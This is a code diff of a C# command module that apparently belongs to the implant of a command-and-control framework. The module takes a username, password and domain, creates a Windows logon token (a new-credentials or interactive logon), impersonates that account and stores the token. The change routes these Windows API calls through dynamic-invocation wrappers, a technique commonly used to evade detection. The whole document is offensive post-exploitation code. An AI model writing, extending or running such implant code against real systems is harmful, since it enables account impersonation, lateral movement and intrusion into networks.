@@ -1,12 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
+using System.Diagnostics;
 using System.Security.Principal;
-using System.Text;
 using System.Threading.Tasks;
-using Engineer.Models;
-using Engineer.Extra;
-using Engineer.Functions;
+using DynamicEngLoading;
+
 
 namespace Engineer.Commands
 {
@@ -16,48 +13,89 @@ namespace Engineer.Commands
 
         public override async Task Execute(EngineerTask task)
         {
-            if (task.Arguments.TryGetValue("/username", out string username))
+            try
             {
-                username = username.TrimStart(' ');
-                //Console.WriteLine(username);
-            }
-            if (task.Arguments.TryGetValue("/password", out string password))
-            {
-                password = password.TrimStart(' ');
-                //Console.WriteLine(password);
-            }
-            if (task.Arguments.TryGetValue("/domain", out string domain))
-            {
-                domain = domain.TrimStart(' ');
-                //Console.WriteLine(domain);
-            }
-
-            if (WinAPIs.Advapi.LogonUser(username, domain, password, WinAPIs.Advapi.LogonType.LOGON32_LOGON_NEW_CREDENTIALS, WinAPIs.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
-            {
-                if (WinAPIs.Advapi.ImpersonateLoggedOnUser(hToken))
+                if (task.Arguments.TryGetValue("/username", out string username))
                 {
-                    WindowsIdentity identity = new WindowsIdentity(hToken);
-                    try
-                    {
-                        identity.Impersonate();
-                        Program.ImpersonatedUser = identity;
-                        Program.ImpersonatedUserChanged = true;
-                        Tasking.FillTaskResults($"Successfully impersonated {domain}\\{username} for remote access, still {identity.Name} locally",task,EngTaskStatus.Complete,TaskResponseType.String);
-                        return;
-                    }
-                    catch (Exception ex)
-                    {
-                        //Console.WriteLine(ex.Message);
-                       // Console.WriteLine(ex.StackTrace);
-                        Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
-                        return;
-                    }
-
+                    username = username.Trim();
                 }
-                Tasking.FillTaskResults("error: " + "created token but Failed to imersonate user",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+                if (task.Arguments.TryGetValue("/password", out string password))
+                {
+                    password = password.Trim();
+                }
+                if (task.Arguments.TryGetValue("/domain", out string domain))
+                {
+                    domain = domain.Trim();
+                }
+
+                if(task.Arguments.ContainsKey("/localauth"))
+                {
+                    if (h_DynInv_Methods.AdvApi32FuncWrapper.LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_INTERACTIVE, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken_local))
+                    {
+                        if (h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hToken_local))
+                        {
+                            WindowsIdentity identity = new WindowsIdentity(hToken_local);
+                            try
+                            {
+                                //string userdomain = $"{domain}\\{username}";
+                                identity.Impersonate();
+                                Program.ImpersonatedUser = identity;
+                                Program.ImpersonatedUserChanged = true;
+                                token_store.AddTokenToStore(hToken_local, Process.GetCurrentProcess().Id);
+                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Successfully impersonated {identity.Name} for local and remote access, use the remove profile command when done", task, EngTaskStatus.Complete, TaskResponseType.String);
+                                return;
+                            }
+                            catch (Exception ex)
+                            {
+                                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
+                                return;
+                            }
+                        }
+                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "created token but Failed to imersonate user", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                        return;
+                    }
+                    else
+                    {
+                        uint lasterror = h_DynInv_Methods.Ker32FuncWrapper.GetLastError();
+                        ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Failed to make interactive logon token, error code {lasterror} ", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                        return; 
+                    }
+                }
+
+                if (h_DynInv_Methods.AdvApi32FuncWrapper.LogonUser(username, domain, password, h_DynInv.Win32.Advapi32.LOGON_TYPE.LOGON32_LOGON_NEW_CREDENTIALS, h_DynInv.Win32.Advapi32.LOGON_PROVIDER.LOGON32_PROVIDER_DEFAULT, out IntPtr hToken))
+                {
+                    if (h_DynInv_Methods.AdvApi32FuncWrapper.ImpersonateLoggedOnUser(hToken))
+                    {
+                        WindowsIdentity identity = new WindowsIdentity(hToken);
+                        try
+                        {
+                            string userdomain = $"{domain}\\{username}";
+                            identity.Impersonate();
+                            Program.ImpersonatedUser = identity;
+                            Program.ImpersonatedUserChanged = true;
+                            token_store.AddTokenToStore(hToken, Process.GetCurrentProcess().Id,userdomain);
+                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults($"Successfully impersonated {userdomain} for remote access, still {identity.Name} locally", task, EngTaskStatus.Complete, TaskResponseType.String);
+                            return;
+                        }
+                        catch (Exception ex)
+                        {
+                            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
+                            return;
+                        }
+                    }
+                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "created token but Failed to imersonate user", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+                    return;
+                }
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Failed to make token", task, EngTaskStatus.FailedWithWarnings, TaskResponseType.String);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+                Console.WriteLine(ex.StackTrace);
+                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(ex.Message, task, EngTaskStatus.Failed, TaskResponseType.String);
                 return;
             }
-            Tasking.FillTaskResults("error: " + "Failed to make token",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
+            
         }
     }
 }
